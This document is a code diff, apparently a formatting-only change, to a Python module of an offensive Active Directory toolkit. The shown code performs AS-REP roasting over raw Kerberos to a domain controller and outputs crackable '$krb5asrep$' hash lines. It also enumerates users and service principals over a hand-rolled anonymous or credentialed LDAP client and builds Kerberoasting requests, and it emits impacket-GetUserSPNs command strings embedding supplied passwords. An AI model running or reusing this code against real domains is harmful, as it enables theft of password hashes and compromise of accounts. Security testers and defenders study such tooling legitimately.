@@ -10,6 +10,7 @@ AS-REP Roast differential judgment (mirrors GetUserSPNs/GetNPUsers):
 * KRB-ERROR error-code 0x12      -> preauth required, user not roastable
 * KRB-ERROR error-code 0x6       -> principal unknown (user does not exist)
 """
+
 import random
 import socket
 from typing import Callable, Dict, List, Optional, Sequence, Tuple
@@ -79,11 +80,11 @@ def _parse_tlv(data: bytes, offset: int = 0) -> Tuple[int, bytes, int]:
     offset += 1
     if b & 0x80:
         n = b & 0x7F
-        length = int.from_bytes(data[offset:offset + n], "big")
+        length = int.from_bytes(data[offset : offset + n], "big")
         offset += n
     else:
         length = b
-    return tag, data[offset:offset + length], offset + length
+    return tag, data[offset : offset + length], offset + length
 
 
 def _seq_fields(content: bytes) -> List[Tuple[int, bytes]]:
@@ -101,10 +102,13 @@ def _principal(name_type: int, names: Sequence[str]) -> bytes:
     return _der_seq(inner)
 
 
-def _kdc_req_body(realm: str, cname: Optional[Sequence[str]] = None,
-                  sname: Optional[Sequence[str]] = None,
-                  etypes: Optional[Sequence[int]] = None,
-                  nonce: Optional[int] = None) -> bytes:
+def _kdc_req_body(
+    realm: str,
+    cname: Optional[Sequence[str]] = None,
+    sname: Optional[Sequence[str]] = None,
+    etypes: Optional[Sequence[int]] = None,
+    nonce: Optional[int] = None,
+) -> bytes:
     etypes = etypes or DEFAULT_ETYPES
     if nonce is None:
         nonce = random.getrandbits(31)
@@ -120,17 +124,20 @@ def _kdc_req_body(realm: str, cname: Optional[Sequence[str]] = None,
     return _der_seq(*fields)
 
 
-def build_as_req(realm: str, username: str, etypes: Optional[Sequence[int]] = None,
-                 nonce: Optional[int] = None) -> bytes:
+def build_as_req(
+    realm: str, username: str, etypes: Optional[Sequence[int]] = None, nonce: Optional[int] = None
+) -> bytes:
     """Build a bare AS-REQ for AS-REP roasting (no PA-DATA)."""
-    body_seq = _kdc_req_body(realm, cname=[username], sname=["krbtgt", realm],
-                             etypes=etypes, nonce=nonce)
+    body_seq = _kdc_req_body(
+        realm, cname=[username], sname=["krbtgt", realm], etypes=etypes, nonce=nonce
+    )
     inner = _ctx(1, _der_int(5)) + _ctx(2, _der_int(AS_REQ_MSG_TYPE)) + _ctx(4, body_seq)
     return _der_tlv(0x6A, inner)
 
 
-def build_tgs_req(realm: str, spn: str, etypes: Optional[Sequence[int]] = None,
-                  nonce: Optional[int] = None) -> bytes:
+def build_tgs_req(
+    realm: str, spn: str, etypes: Optional[Sequence[int]] = None, nonce: Optional[int] = None
+) -> bytes:
     """Build a structural TGS-REQ skeleton for a service principal.
 
     The real KDC requires a PA-TGS-REQ authenticator encrypted with a TGT
@@ -183,8 +190,7 @@ def parse_kdc_response(data: bytes) -> Dict:
     return {"msg_type": AS_REP_MSG_TYPE, "etype": etype, "cipher": cipher}
 
 
-def default_krb_sender(host: str, port: int, payload: bytes,
-                       timeout: float = 3.0) -> bytes:
+def default_krb_sender(host: str, port: int, payload: bytes, timeout: float = 3.0) -> bytes:
     """Send a Kerberos message over TCP with 4-byte length framing."""
     s = socket.create_connection((host, port), timeout=timeout)
     try:
@@ -208,10 +214,14 @@ def default_krb_sender(host: str, port: int, payload: bytes,
         s.close()
 
 
-def asrep_roast(dc_ip: str, realm: str, usernames: Sequence[str],
-                etypes: Optional[Sequence[int]] = None,
-                timeout: float = 3.0,
-                sender: Optional[Callable] = None) -> Dict:
+def asrep_roast(
+    dc_ip: str,
+    realm: str,
+    usernames: Sequence[str],
+    etypes: Optional[Sequence[int]] = None,
+    timeout: float = 3.0,
+    sender: Optional[Callable] = None,
+) -> Dict:
     """AS-REP roast a user list via a bare AS-REQ against TCP 88."""
     sender = sender or default_krb_sender
     result: Dict = {"success": False, "asrep_users": [], "errors": []}
@@ -225,17 +235,25 @@ def asrep_roast(dc_ip: str, realm: str, usernames: Sequence[str],
             verdict = parse_kdc_response(resp)
             if verdict.get("msg_type") == AS_REP_MSG_TYPE:
                 hash_line = "$krb5asrep$%d$%s@%s:%s" % (
-                    verdict["etype"], username, realm.upper(), verdict["cipher"].hex())
-                result["asrep_users"].append({
-                    "username": username,
-                    "etype": verdict["etype"],
-                    "hash": hash_line,
-                })
+                    verdict["etype"],
+                    username,
+                    realm.upper(),
+                    verdict["cipher"].hex(),
+                )
+                result["asrep_users"].append(
+                    {
+                        "username": username,
+                        "etype": verdict["etype"],
+                        "hash": hash_line,
+                    }
+                )
             else:
-                result["errors"].append({
-                    "username": username,
-                    "error_code": verdict.get("error_code"),
-                })
+                result["errors"].append(
+                    {
+                        "username": username,
+                        "error_code": verdict.get("error_code"),
+                    }
+                )
         except Exception as exc:
             result["errors"].append({"username": username, "error": str(exc)})
     result["success"] = bool(result["asrep_users"])
@@ -285,8 +303,9 @@ class NativeLdapClient:
     ``sendall(data)`` and ``close()``. When omitted a real socket is used.
     """
 
-    def __init__(self, host: str, port: int = LDAP_PORT, timeout: float = 3.0,
-                 conn: Optional[object] = None):
+    def __init__(
+        self, host: str, port: int = LDAP_PORT, timeout: float = 3.0, conn: Optional[object] = None
+    ):
         self.host = host
         self.port = port
         self.timeout = timeout
@@ -332,9 +351,13 @@ class NativeLdapClient:
                         result_code = rv[0]
         return {"success": result_code == 0, "result_code": result_code}
 
-    def search(self, base_dn: str, scope: int = 2,
-               filter_tlv: Optional[bytes] = None,
-               attributes: Optional[Sequence[str]] = None) -> Dict:
+    def search(
+        self,
+        base_dn: str,
+        scope: int = 2,
+        filter_tlv: Optional[bytes] = None,
+        attributes: Optional[Sequence[str]] = None,
+    ) -> Dict:
         self._msgid += 1
         attributes = list(attributes or [])
         inner = (
@@ -359,12 +382,14 @@ class NativeLdapClient:
                     for rt, rv in _seq_fields(fval):
                         if rt == 0x0A:
                             result_code = rv[0]
-                    return {"entries": entries, "result_code": result_code,
-                            "success": result_code == 0}
+                    return {
+                        "entries": entries,
+                        "result_code": result_code,
+                        "success": result_code == 0,
+                    }
             resp = self._stream.read_message()
             if not resp:
-                return {"entries": entries, "result_code": result_code,
-                        "success": result_code == 0}
+                return {"entries": entries, "result_code": result_code, "success": result_code == 0}
             _, value, _ = _parse_tlv(resp, 0)
 
 
@@ -404,16 +429,22 @@ def _ldap_filter_present(attr: str) -> bytes:
 
 
 def _user_filter() -> bytes:
-    return _ldap_filter_and([_ldap_filter_eq("objectClass", "user"),
-                             _ldap_filter_eq("objectClass", "person")])
+    return _ldap_filter_and(
+        [_ldap_filter_eq("objectClass", "user"), _ldap_filter_eq("objectClass", "person")]
+    )
 
 
 def _base_dn(domain: str) -> str:
     return ",".join("dc=%s" % part for part in domain.split(".") if part)
 
 
-def ldap_anonymous_enum(dc_ip: str, domain: str, base_dn: Optional[str] = None,
-                        timeout: float = 3.0, conn: Optional[object] = None) -> Dict:
+def ldap_anonymous_enum(
+    dc_ip: str,
+    domain: str,
+    base_dn: Optional[str] = None,
+    timeout: float = 3.0,
+    conn: Optional[object] = None,
+) -> Dict:
     """Native anonymous LDAP user enumeration with no ldap3 dependency."""
     result: Dict = {"success": False, "bound": False, "entries": [], "error": None}
     client = NativeLdapClient(dc_ip, timeout=timeout, conn=conn)
@@ -425,9 +456,12 @@ def ldap_anonymous_enum(dc_ip: str, domain: str, base_dn: Optional[str] = None,
             return result
         base_dn = base_dn or _base_dn(domain)
         result["base_dn"] = base_dn
-        out = client.search(base_dn, scope=2, filter_tlv=_user_filter(),
-                            attributes=["sAMAccountName", "userAccountControl",
-                                        "description", "memberOf"])
+        out = client.search(
+            base_dn,
+            scope=2,
+            filter_tlv=_user_filter(),
+            attributes=["sAMAccountName", "userAccountControl", "description", "memberOf"],
+        )
         if not out["success"]:
             result["error"] = "search failed: code %d" % out["result_code"]
             return result
@@ -440,25 +474,35 @@ def ldap_anonymous_enum(dc_ip: str, domain: str, base_dn: Optional[str] = None,
     return result
 
 
-def spn_enum(dc_ip: str, domain: str, base_dn: Optional[str] = None,
-             username: Optional[str] = None, password: Optional[str] = None,
-             timeout: float = 3.0, conn: Optional[object] = None) -> Dict:
+def spn_enum(
+    dc_ip: str,
+    domain: str,
+    base_dn: Optional[str] = None,
+    username: Optional[str] = None,
+    password: Optional[str] = None,
+    timeout: float = 3.0,
+    conn: Optional[object] = None,
+) -> Dict:
     """Enumerate accounts with servicePrincipalName via native LDAP."""
     result: Dict = {"success": False, "spns": [], "error": None}
     client = NativeLdapClient(dc_ip, timeout=timeout, conn=conn)
     try:
         if username and password:
-            bind = client.bind(("%s@%s" % (username, domain)).encode("utf-8"),
-                               password.encode("utf-8"))
+            bind = client.bind(
+                ("%s@%s" % (username, domain)).encode("utf-8"), password.encode("utf-8")
+            )
         else:
             bind = client.bind()
         if not bind["success"]:
             result["error"] = "bind failed: code %d" % bind["result_code"]
             return result
         base_dn = base_dn or _base_dn(domain)
-        out = client.search(base_dn, scope=2,
-                            filter_tlv=_ldap_filter_present("servicePrincipalName"),
-                            attributes=["sAMAccountName", "servicePrincipalName"])
+        out = client.search(
+            base_dn,
+            scope=2,
+            filter_tlv=_ldap_filter_present("servicePrincipalName"),
+            attributes=["sAMAccountName", "servicePrincipalName"],
+        )
         if not out["success"]:
             result["error"] = "search failed: code %d" % out["result_code"]
             return result
@@ -477,18 +521,31 @@ def spn_enum(dc_ip: str, domain: str, base_dn: Optional[str] = None,
     return result
 
 
-def kerberoast_skeleton(dc_ip: str, domain: str, base_dn: Optional[str] = None,
-                        username: Optional[str] = None, password: Optional[str] = None,
-                        timeout: float = 3.0, conn: Optional[object] = None) -> Dict:
+def kerberoast_skeleton(
+    dc_ip: str,
+    domain: str,
+    base_dn: Optional[str] = None,
+    username: Optional[str] = None,
+    password: Optional[str] = None,
+    timeout: float = 3.0,
+    conn: Optional[object] = None,
+) -> Dict:
     """Kerberoast skeleton: native SPN enumeration + TGS-REQ frame builder."""
-    result: Dict = {"success": False, "skeleton": True, "spns": [], "users": [],
-                    "requests": [], "commands": [], "error": None}
+    result: Dict = {
+        "success": False,
+        "skeleton": True,
+        "spns": [],
+        "users": [],
+        "requests": [],
+        "commands": [],
+        "error": None,
+    }
     enum = spn_enum(dc_ip, domain, base_dn, username, password, timeout, conn)
     if not enum["success"]:
         result["error"] = enum["error"]
         result["commands"] = [
-            "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s" % (
-                dc_ip, domain, username or "USER", password or "PASS"),
+            "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s"
+            % (dc_ip, domain, username or "USER", password or "PASS"),
         ]
         return result
     realm = domain.upper()
@@ -503,21 +560,29 @@ def kerberoast_skeleton(dc_ip: str, domain: str, base_dn: Optional[str] = None,
         except Exception as exc:
             result["requests"].append({"spn": item["spn"], "error": str(exc)})
     result["users"] = sorted(seen_users)
-    result["note"] = ("Native SPN enumeration done; TGS extraction requires TGT "
-                      "session-key crypto - use impacket for the full roast")
+    result["note"] = (
+        "Native SPN enumeration done; TGS extraction requires TGT "
+        "session-key crypto - use impacket for the full roast"
+    )
     result["commands"] = [
-        "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s" % (
-            dc_ip, domain, username or "USER", password or "PASS"),
+        "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s"
+        % (dc_ip, domain, username or "USER", password or "PASS"),
     ]
     result["success"] = True
     return result
 
 
-def run(target: str, dc_ip: Optional[str] = None, domain: Optional[str] = None,
-         username: Optional[str] = None, password: Optional[str] = None,
-         userlist: Optional[Sequence[str]] = None, timeout: float = 3.0,
-         conn: Optional[object] = None,
-         sender: Optional[Callable] = None) -> Dict:
+def run(
+    target: str,
+    dc_ip: Optional[str] = None,
+    domain: Optional[str] = None,
+    username: Optional[str] = None,
+    password: Optional[str] = None,
+    userlist: Optional[Sequence[str]] = None,
+    timeout: float = 3.0,
+    conn: Optional[object] = None,
+    sender: Optional[Callable] = None,
+) -> Dict:
     """Drop-in entry for the domain command (mirrors domain_hunt.run)."""
     if not domain and target:
         domain = target
@@ -529,10 +594,11 @@ def run(target: str, dc_ip: Optional[str] = None, domain: Optional[str] = None,
     result: Dict = {"domain": domain, "dc_ip": dc_ip, "success": True}
     if dc_ip and domain:
         if userlist:
-            result["asrep_roast"] = asrep_roast(dc_ip, domain, userlist,
-                                                timeout=timeout, sender=sender)
+            result["asrep_roast"] = asrep_roast(
+                dc_ip, domain, userlist, timeout=timeout, sender=sender
+            )
         result["ldap"] = ldap_anonymous_enum(dc_ip, domain, timeout=timeout, conn=conn)
-        result["kerberoast"] = kerberoast_skeleton(dc_ip, domain, username=username,
-                                                   password=password, timeout=timeout,
-                                                   conn=conn)
+        result["kerberoast"] = kerberoast_skeleton(
+            dc_ip, domain, username=username, password=password, timeout=timeout, conn=conn
+        )
     return result
